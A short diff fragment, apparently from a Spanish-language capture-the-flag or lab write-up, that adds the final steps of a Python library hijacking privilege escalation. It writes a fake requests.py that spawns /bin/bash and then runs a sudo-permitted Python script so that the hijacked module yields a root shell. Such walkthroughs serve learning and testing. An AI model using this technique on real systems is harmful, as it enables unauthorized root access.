@@ -170,3 +170,10 @@ Por lo que podemos hacer **Python library hijacking**.
 ```
 echo 'import os; os.system("/bin/bash")' > /home/iker/requests.py
 ```
+Y ahora si ejecutamos
+```
+sudo /usr/bin/python3 /home/iker/geo_ip.py
+```
+y finalmente seremos usuarios root.
+<img width="536" height="151" alt="image" src="https://github.com/user-attachments/assets/2c69eccc-6c06-4745-96da-a1855ac34b1b" />
+
